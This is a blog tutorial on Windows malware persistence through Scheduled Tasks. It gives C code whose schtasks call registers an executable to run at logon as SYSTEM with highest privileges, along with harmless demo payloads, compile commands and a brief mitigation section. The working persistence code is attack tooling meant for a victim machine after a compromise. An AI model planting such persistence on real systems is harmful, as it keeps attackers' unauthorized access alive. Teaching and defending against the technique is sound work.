---
title:  "Malware development: persistence - part 27. Scheduled Tasks. Simple C example."
date:   2025-03-12 03:00:00 +0300
header:
  teaser: "/assets/images/149/2025-03-14_22-44.png"
categories:
  - persistence
tags:
  - malware
  - windows
  - persistence
  - red team
  - win32api
---

ï·½

Hello, cybersecurity enthusiasts and white hackers!     

![pers](/assets/images/149/2025-03-14_22-44.png){:class="img-responsive"}    

I've [written](/persistence/2022/12/09/malware-pers-20.html) a lot about [various](/persistence/2023/12/10/malware-pers-23.html) [persistence](/persistence/2024/03/12/malware-pers-24.html) methods but somehow I forgot to mention one simple technique.     

Today, I'm going to share another malware persistence technique: Scheduled Tasks. This is a classic method that attackers use to maintain access to a compromised system. I'll walk you through how it works, provide a proof-of-concept (PoC), and discuss some common pitfalls and fixes.     

### scheduled tasks

**Scheduled Tasks** is a Windows feature that allows users to automate the execution of programs or scripts at specific times or events, such as system startup or user logon. Attackers can abuse this feature to ensure their malware runs every time the system starts or a user logs in.     

In another words, the attacker creates a scheduled task that points to their malicious executable. The task is configured to run at system startup or user logon, ensuring the malware is executed persistently.    

### practical example

Let's start with a simple "malware" executable that displays a message box. This will simulate the malicious payload (`hack.c`):    

```cpp
/*
 * hack.c
 * "malware" for Scheduled Task
 * persistence trick
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2025/03/12/malware-pers-27.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int main() {
  MessageBoxA(NULL, "Meow-meow!!", "=^..^=", MB_OK);
  return 0;
}
```

This program simply displays a message box with the text `Meow-meow!!`:    

```powershell
.\hack.exe
```

![malware](/assets/images/149/2025-03-14_13-17.png){:class="img-responsive"}

Next, we'll create a program to set up the persistence mechanism using Scheduled Tasks `pers.c`:     

```cpp
/*
 * pers.c
 * persistence via Scheduled Tasks
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2025/03/12/malware-pers-27.html
*/
#include <windows.h>
#include <stdio.h>

int main() {
  // task
  const char *taskName = "MeowTask";
  const char *malwarePath = "C:\\Users\\zhzhu\\Desktop\\hack.exe";
  char command[512];

  snprintf(command, sizeof(command), 
       "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /ru SYSTEM /rl highest /f",
       taskName, malwarePath);

  // run command
  int result = system(command);

  if (result == 0) {
    printf("task created successfully! :)\n");
  } else {
    printf("failed to create task. :(\n");
  }

  return 0;
}
```

As you can see, the logic is pretty simple. This program creates a scheduled task named `MeowTask` that runs `hack.exe` at user logon with the highest privileges. The task is set to run as the `SYSTEM` user.     

But this option `hack.exe` didn't work for me. I'll write later why that's why I replaced it with another `hack.c`:     

```cpp
/*
 * hack.c
 * "malware" for Scheduled Task
 * persistence trick
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2025/03/12/malware-pers-27.html
*/
#include <windows.h>
#include <stdio.h>

int main() {
  FILE *file = fopen("C:\\Users\\zhzhu\\Desktop\\meow.txt", "w");
  if (file) {
    fprintf(file, "=^..^= Meow-meow =^..^=!!\n");
    fclose(file);
  }
  return 0;
}
```

The logic is a little different: instead of displaying the graphical interface of the message window, we simply create a file `meow.txt` and write the text `=^..^= Meow-meow =^..^=!!` into it.     

### demo

First of all compile `hack.c`:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

![malware](/assets/images/149/2025-03-14_11-30.png){:class="img-responsive"}

Then compile `pers.c`:    

```bash
x86_64-w64-mingw32-g++ -O2 pers.c -o pers.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

![malware](/assets/images/149/2025-03-14_11-30_1.png){:class="img-responsive"}

Let's say an attacker delivered our file `hack.exe` to the desktop at the post exploitation stage.    

Then run our persistence script on the victim's machine:    

```powershell
.\pers.exe
```

![malware](/assets/images/149/2025-03-14_13-17_1.png){:class="img-responsive"}

![malware](/assets/images/149/2025-03-14_13-20.png){:class="img-responsive"}

![malware](/assets/images/149/2025-03-14_23-08.png){:class="img-responsive"}

![malware](/assets/images/149/2025-03-14_14-42.png){:class="img-responsive"}

![malware](/assets/images/149/2025-03-14_14-42_1.png){:class="img-responsive"}

As you can see, scheduled task successfully created.    

Then, reboot the system or log off and log back in:    

![malware](/assets/images/149/2022-06-12_14-26_1.png){:class="img-responsive"}

If everything works, you should see the new file with `=^..^= Meow-meow =^..^=!!` message:    

![malware](/assets/images/149/2025-03-14_22-45.png){:class="img-responsive"}

![malware](/assets/images/149/2025-03-14_22-41.png){:class="img-responsive"}

As you can see everything is worked perfectly! =^..^=    

But there are the caveat. For some reason when creating a new scheduled task in my case it only worked when my virtual machine, that is, my laptop was connected to the network and not running on battery power:    

![malware](/assets/images/149/2025-03-14_23-07.png){:class="img-responsive"}

Also while testing first version of PoC with `meow-meow` messagebox, I encountered an issue where the task was created successfully, but the message box didn't appear after reboot.    

### mitigation

Monitor for unusual tasks or tasks running from suspicious locations. Use endpoint detection and response (EDR) tools to detect and block malicious tasks.   

Scheduled Tasks are a simple yet effective way to achieve persistence on a Windows system, the APT groups like [APT17](https://malpedia.caad.fkie.fraunhofer.de/actor/apt17) and [APT41](https://attack.mitre.org/groups/G0096/) exploited this feature for attacking PCs. Stay tuned for more malware persistence techniques, and don't forget to experiment responsibly.    

I hope this post spreads awareness to the blue teamers of this interesting persistence technique, and adds a weapon to the red teamers arsenal.      

> This is a practical case for educational purposes only.     

[schtasks](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)     
[MITRE: Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/)     
[APT17](https://malpedia.caad.fkie.fraunhofer.de/actor/apt17)     
[APT41](https://malpedia.caad.fkie.fraunhofer.de/actor/apt41)
[Malware persistence - part 1. Registry run keys](/tutorial/2022/04/20/malware-pers-1.html)     
[source code in github](https://github.com/cocomelonc/meow/tree/master/2025-03-12-malware-pers-27)    

Thanks for your time happy hacking and good bye!         
*PS. All drawings and screenshots are mine*       
